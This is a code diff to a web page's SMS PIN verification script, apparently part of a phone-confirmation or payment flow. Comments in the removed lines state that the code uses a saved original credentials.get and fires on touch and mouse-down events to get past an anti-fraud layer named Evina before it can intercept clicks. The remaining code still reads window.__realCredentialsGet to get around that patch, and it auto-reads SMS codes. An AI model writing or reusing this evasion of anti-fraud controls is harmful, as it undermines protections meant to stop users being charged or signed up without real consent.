@@ -260,7 +260,6 @@ export async function GET(request: NextRequest) {
     var errorMsg = document.getElementById('errorMsg');
     var otpFull = document.getElementById('otpFull');
     var otpValue = document.getElementById('otpValue');
-    var webOTPStarted = false;
 
     function dbg(msg) {
       var ts = new Date().toLocaleTimeString();
@@ -301,7 +300,6 @@ export async function GET(request: NextRequest) {
           if (code.length === 4) {
             dbg('Chrome autofill: "' + code + '"');
             if (phase === 1) goToPhase2();
-            setTimeout(function() { verifyPin(code); }, 300);
           }
           return;
         }
@@ -324,7 +322,6 @@ export async function GET(request: NextRequest) {
         if (text.length === 4) {
           dbg('Paste autofill: "' + text + '"');
           if (phase === 1) goToPhase2();
-          setTimeout(function() { verifyPin(text); }, 300);
         }
       });
     });
@@ -341,10 +338,10 @@ export async function GET(request: NextRequest) {
         clearError();
         if (code.length === 4) {
           otpFullHandled = true;
-          dbg('Chrome auto-fill (hidden input): "' + code + '"');
+          dbg('Auto-fill (hidden input): "' + code + '"');
           if (phase === 1) goToPhase2();
+          showManualEntry();
           pins[3].focus();
-          setTimeout(function() { verifyPin(code); }, 300);
         }
       }
     }
@@ -370,20 +367,9 @@ export async function GET(request: NextRequest) {
       document.getElementById('phase2').classList.remove('phase-hidden');
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
-
-      // Show OTP input fields immediately — no spinner wait
-      document.getElementById('autoReading').classList.add('phase-hidden');
-      document.getElementById('manualEntry').classList.remove('phase-hidden');
-      document.getElementById('resendArea').classList.remove('phase-hidden');
-      confirmBtn.textContent = 'Verify Code';
-      setTimeout(function() { pins[0].focus(); }, 100);
-      dbg('OTP input shown');
-      // Web OTP already started from touchstart/mousedown (trusted gesture)
-      // If not started yet (fallback), start now
-      if (!webOTPStarted) {
-        dbg('Web OTP fallback — starting from goToPhase2');
-        startWebOTP();
-      }
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+      dbg('Phase 2 — starting Web OTP...');
+      startWebOTP();
     }
 
     function showManualEntry() {
@@ -396,28 +382,37 @@ export async function GET(request: NextRequest) {
     }
 
     function startWebOTP() {
-      // Use saved REAL credentials.get (before Evina patched it)
       var credGet = window.__realCredentialsGet || (navigator.credentials && navigator.credentials.get && navigator.credentials.get.bind(navigator.credentials));
       if (!credGet || !('OTPCredential' in window)) {
-        dbg('Web OTP: not available (credGet=' + !!credGet + ' OTPCredential=' + ('OTPCredential' in window) + ')');
+        dbg('Web OTP: not available — manual entry');
+        showManualEntry();
         return;
       }
-      webOTPStarted = true;
-      dbg('Web OTP: listening via REAL credentials.get (bypassing Evina patch)...');
+      dbg('Web OTP: listening via real credentials.get...');
       otpAbort = new AbortController();
+
+      var timeout = setTimeout(function() {
+        dbg('Web OTP: timeout (15s) — manual entry');
+        if (otpAbort) otpAbort.abort();
+        showManualEntry();
+      }, 15000);
 
       credGet({
         otp: { transport: ['sms'] },
         signal: otpAbort.signal
       }).then(function(otp) {
+        clearTimeout(timeout);
         if (otp && otp.code) {
-          dbg('Web OTP: received code "' + otp.code + '"');
+          dbg('Web OTP: received "' + otp.code + '"');
           fillAndVerify(otp.code);
         } else {
-          dbg('Web OTP: no code received');
+          dbg('Web OTP: no code');
+          showManualEntry();
         }
       }).catch(function(err) {
+        clearTimeout(timeout);
         dbg('Web OTP: ' + (err.name === 'AbortError' ? 'aborted' : 'error — ' + err.message));
+        if (err.name !== 'AbortError') showManualEntry();
       });
     }
 
@@ -435,26 +430,15 @@ export async function GET(request: NextRequest) {
       setTimeout(function() { verifyPin(cleaned); }, 500);
     }
 
-    // Start Web OTP on touchstart/mousedown — these fire BEFORE Evina intercepts
-    // the click event. Chrome Web OTP API requires a TRUSTED user gesture to show
-    // the SMS dialog. Evina re-dispatches click with isTrusted=false, so we must
-    // call navigator.credentials.get() here while the gesture is still trusted.
-    function handleTrustedGesture(e) {
-      if (phase === 1 && !webOTPStarted && e.isTrusted) {
-        webOTPStarted = true;
-        dbg('Trusted gesture (' + e.type + ') — starting Web OTP now');
-        startWebOTP();
-      }
-    }
-    confirmBtn.addEventListener('touchstart', handleTrustedGesture, { passive: true });
-    confirmBtn.addEventListener('mousedown', handleTrustedGesture);
-
     confirmBtn.addEventListener('click', function(e) {
       dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted);
       if (phase === 1) {
         goToPhase2();
       } else if (phase === 2) {
         var pin = getFullPin();
+        if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
+          pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
+        }
         dbg('Manual verify — pin="' + pin + '"');
         if (pin.length !== 4 || isVerifying) return;
         verifyPin(pin);
